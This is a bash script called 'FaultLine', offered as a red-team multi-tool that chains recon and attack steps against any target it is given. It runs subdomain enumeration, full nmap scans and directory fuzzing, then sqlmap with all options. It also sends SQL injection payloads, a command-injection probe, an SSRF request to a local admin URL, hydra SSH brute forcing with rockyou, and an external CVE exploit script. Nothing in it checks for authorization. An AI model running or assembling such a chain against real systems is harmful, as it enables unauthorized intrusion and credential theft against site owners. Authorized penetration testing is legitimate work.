#!/bin/bash

# FaultLine: Red-Team Hacking Suite - Version 4.2
# A comprehensive and advanced framework for recon, vulnerability discovery, and exploitation.

# ======= COLORS =======
RED="\033[0;31m"
GREEN="\033[0;32m"
CYAN="\033[0;36m"
YELLOW="\033[1;33m"
NC="\033[0m" # No Color

# ======= VARIABLES =======
SAVE_MODE=0
OUTPUT_DIR=""
DEBUG=1 # Set to 0 to disable debugging

debug() {
    if [[ "$DEBUG" -eq 1 ]]; then
        echo -e "${YELLOW}[DEBUG] $1${NC}"
    fi
}

# ======= BANNER =======
banner() {
    echo -e "${CYAN}"
    echo "__| |_________________________________________________________| |__";
    echo "__   _________________________________________________________   __";
    echo "  | |                                                         | |  ";
    echo "  | |                                                         | |  ";
    echo "  | |   _______    ___      __    __   __     .___________.   | |  ";
    echo "  | |  |   ____|  /   \    |  |  |  | |  |    |           |   | |  ";
    echo "  | |  |  |__    /  ^  \   |  |  |  | |  |    \---|  |---/    | |  ";
    echo "  | |  |   __|  /  /_\  \  |  |  |  | |  |        |  |        | |  ";
    echo "  | |  |  |    /  _____  \ |  \__/  | |  ----.    |  |        | |  ";
    echo "  | |  |__|   /__/     \__\ \______/  |_______|   |__|        | |  ";
    echo "  | |                                                         | |  ";
    echo "  | |   __       __  .__   __.  _______  __                   | |  ";
    echo "  | |  |  |     |  | |  \ |  | |   ____||  |                  | |  ";
    echo "  | |  |  |     |  | |   \|  | |  |__   |  |                  | |  ";
    echo "  | |  |  |     |  | |  .    | |   __|  |  |                  | |  ";
    echo "  | |  |  \----.|  | |  |\   | |  |____ |__|                  | |  ";
    echo "  | |  |_______||__| |__| \__| |_______|(__)                  | |  ";
    echo "  | |                                                         | |  ";
    echo "  | |                                                         | |  ";
    echo "__| |_________________________________________________________| |__";
    echo "__   _________________________________________________________   __";
    echo "  | |                                                         | |  ";
    echo -e "${NC}FaultLine: Red-Team Pentesting Suite\n"

    echo "      ${YELLOW} Offensive Security Multi-Tool
            
        ------------------------------------------------------------
            Developer: Austin Tatham       Version: 1.0.0
        ------------------------------------------------------------
 "
}


# ======= USAGE =======
usage() {
    echo -e "${GREEN}Usage:${NC} $0 -t <target> -m <mode> [-s <output_dir>]"
    echo "Options:"
    echo -e "  -t, --target <domain|file>  Specify the target domain or file containing domains"
    echo -e "  -m, --mode <recon|exploit|all>  Choose recon, exploit, or all modes"
    echo -e "  -s, --save <directory>  Enable saving output to the specified directory"
    echo -e "  -h, --help  Show this help menu"
    exit 1
}

# ======= OPTIONAL SAVE FUNCTIONALITY =======
save_output() {
    local data="$1"
    local filename="$2"
    if [[ "$SAVE_MODE" -eq 1 ]]; then
        echo "$data" >> "$OUTPUT_DIR/$filename"
        echo -e "${GREEN}[+] Saved to $OUTPUT_DIR/$filename${NC}"
    fi
}

crawl_html() {
    echo -e "${CYAN}[+] Crawling HTML for sensitive data: $TARGET${NC}"
    curl -s "$TARGET" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u > "$OUTPUT_DIR/urls.txt"
    curl -s "$TARGET" | grep -E "<!--.*-->" >> "$OUTPUT_DIR/comments.txt"
    echo -e "${GREEN}[+] Crawling results saved to $OUTPUT_DIR/urls.txt and $OUTPUT_DIR/comments.txt${NC}"
}
# ======= RECONNAISSANCE =======
recon_module() {
    local domain="$1"
    echo -e "${CYAN}[+] Starting Reconnaissance on $domain...${NC}"

    # Subdomain Enumeration
    echo "[*] Enumerating subdomains..."
    subdomains=$(subfinder -d "$domain" && dmitry -i -w -n -s -e -p "$domain" | sort -u)
    echo -e "${GREEN}[+] Subdomains:${NC}\n$subdomains"
    save_output "$subdomains" "subdomains_$domain.txt"

    # FinalRecon Integration
    echo "[*] Running FinalRecon..."
    finalrecon_results=$(finalrecon --url https://"$domain" -w /grep/home/fuzz.txt)
    echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
    save_output "$finalrecon_results" "finalrecon_$domain.txt"

    # Port Scanning
    echo "[*] Scanning ports..."
    nmap_results=$(nmap -sV -O -p- -T4 "$domain")
    echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
    save_output "$nmap_results" "nmap_$domain.txt"

    # Directory Enumeration
    echo "[*] Fuzzing directories..."
    directories=$(ffuf -w "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" -u "$domain/FUZZ")
    echo -e "${GREEN}[+] Directories:${NC}\n$directories"
    save_output "$directories" "directories_$domain.txt"
}
parse_js_files() {
    echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
    curl -s "$TARGET" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2 > "$OUTPUT_DIR/js_files.txt"
    
    for js in $(cat "$OUTPUT_DIR/js_files.txt"); do
        curl -s "$js" | grep -Eo 'http(s)?://[^"]+' >> "$OUTPUT_DIR/api_endpoints.txt"
    done

    echo -e "${GREEN}[+] JavaScript endpoints saved to $OUTPUT_DIR/api_endpoints.txt${NC}"
}


# ======= VULNERABILITY TESTING =======
vulnerability_module() {
    local domain="$1"
    echo -e "${CYAN}[+] Testing vulnerabilities on $domain...${NC}"

    # SQL Injection
    echo "[*] Testing for SQL Injection..."
    sql_injection_results=$(sqlmap -u "$domain" --delay=3 --mobile --fingerprint --all --batch --crawl=3)
    echo -e "${GREEN}[+] SQL Injection Results:${NC}\n$sql_injection_results"
    save_output "$sql_injection_results" "sql_injection_$domain.txt"

    # XSS Testing
    echo "[*] Testing for XSS..."
    xss_results=$(curl -s "$domain" | grep -o '<script>.*</script>')
    echo -e "${GREEN}[+] XSS Results:${NC}\n$xss_results"
    save_output "$xss_results" "xss_$domain.txt"
}
vulns_deep_crawl() {
    echo -e "${RED}[+] IMPORTANT!${NC}"
    echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET...5-10 min to complete ${NC}"
    deep_crawl=$(sudo ./nmapAutomator.sh -H "$TARGET" -t Full)
    echo -e "${GREEN}[+] First layer vulnerabilities:${NC}\n$deep_crawl"
    echo -e "${YELLOW}[+] Wrapping up 'Crawl' ${NC}"
    vulns=$(sudo ./nmapAutomator.sh -H "$TARGET" -t Vulns)
    echo -e "${GREEN}[+] Potential Vulnerabilities:${NC}\n$vulns"

}
privilege_escalation_test() {
    echo -e "${CYAN}[+] Testing privilege escalation vulnerabilities.${NC}"
    curl -s "$TARGET/admin" | grep -q "403" && echo "Possible admin panel access." >> "$OUTPUT_DIR/escalation.txt"
    echo -e "${GREEN}[+] Privilege escalation test results saved.${NC}"
}
test_broken_access_control() {
    echo -e "${CYAN}[+] Testing broken access control for: $1${NC}"
    response=$(curl -s "$1?id=1" -w "%{http_code}")
    if [[ $response == *"200"* ]]; then
        echo -e "${RED}[!] Potential IDOR vulnerability detected at $1${NC}" >> "$OUTPUT_DIR/$1_idor.txt"
    fi
    echo -e "${GREEN}[+] Broken access control testing completed.${NC}"
}
brute_force_ssh() {
    WORDLIST="${1:-/usr/share/wordlists/rockyou.txt}"
    echo -e "${CYAN}[+] Brute forcing SSH on: $TARGET${NC}"
    hydra -L "$WORDLIST" -P "$WORDLIST" ssh://"$TARGET" -o "$OUTPUT_DIR/ssh_bruteforce.txt"
    echo -e "${GREEN}[+] SSH brute force results saved to $OUTPUT_DIR/ssh_bruteforce.txt${NC}"
}
ssrf_check() {
    echo "[*] Testing for SSRF vulnerabilities..."
    while IFS= read -r subdomain; do
    curl -s -X POST -d "url=http://127.0.0.1:8080/admin" "$subdomain" >> "$OUTPUT_DIR/ssrf_$domain.txt"
    done < "$OUTPUT_DIR/subdomains_$domain.txt"
}


# SQL Injection Testing
sql_injection_test() {
    echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $TARGET${NC}"
    PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
    for PAYLOAD in "${PAYLOADS[@]}"; do
        RESPONSE=$(curl -s "$TARGET?id=$PAYLOAD")
        if [[ $RESPONSE =~ "error" || $RESPONSE =~ "syntax" ]]; then
            echo -e "${GREEN}[!] SQL Injection vulnerability detected with payload: $PAYLOAD${NC}"
        fi
    done
}

# ======= EXPLOITATION =======
exploit_module() {
    local domain="$1"
    echo -e "${CYAN}[+] Exploiting vulnerabilities on $domain...${NC}"

    # Command Injection
    echo "[*] Testing for Command Injection..."
    cmd_injection_results=$(curl -s -X POST -d "cmd=whoami" "$domain" | grep -i "root")
    echo -e "${GREEN}[+] Command Injection Results:${NC}\n$cmd_injection_results"
    save_output "$cmd_injection_results" "cmd_injection_$domain.txt"
}
Exploit_Known_CVEs() {
    echo "[*] Exploiting known CVEs..."
    python3 ./cve_exploit.py "$TARGET" >> "$OUTPUT_DIR/cve_exploits_$TARGET.txt"
    echo -e "${GREEN}[+] CVE exploitation completed.${NC}"
}

# ======= MAIN FUNCTION =======
main() {
    banner
    if [[ -z "$TARGET" || -z "$MODE" ]]; then
        usage
    fi

    case "$MODE" in
        recon)
            recon_module "$TARGET"
            crawl_html "$TARGET"
            vulnerability_module "$TARGET"
            test_broken_access_control "$TARGET"
            privilege_escalation_test "$TARGET"
            vulns_deep_crawl "$TARGET"
            parse_js_files "$TARGET"
            ssrf_check "$TARGET"
            ;;
        exploit)
            exploit_module "$TARGET"
            sql_injection_test "$TARGET"
            vulns_deep_crawl "$TARGET"
            ;;
        all)
            recon_module "$TARGET"
            crawl_html "$TARGET"
            parse_js_files "$TARGET"
            vulns_deep_crawl "$TARGET"
            sql_injection_test "$TARGET"
            privilege_escalation_test "$TARGET"
            test_broken_access_control "$TARGET"
            vulnerability_module "$TARGET"
            exploit_module "$TARGET"
            ssrf_check "$TARGET"
            ;;
        *)
            echo -e "${RED}[!] Invalid mode. Use recon, exploit, or all.${NC}"
            usage
            ;;
    esac
    echo -e "${GREEN}[+] FaultLine completed.${NC}"
}

# ======= ARGUMENT PARSING =======
while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)
            TARGET="$2"
            shift
            ;;
        -m|--mode)
            MODE="$2"
            shift
            ;;
        -s|--save)
            SAVE_MODE=1
            OUTPUT_DIR="$2"
            mkdir -p "$OUTPUT_DIR"
            shift
            ;;
        -h|--help)
            usage
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${NC}"
            usage
            ;;
    esac
    shift
done

main
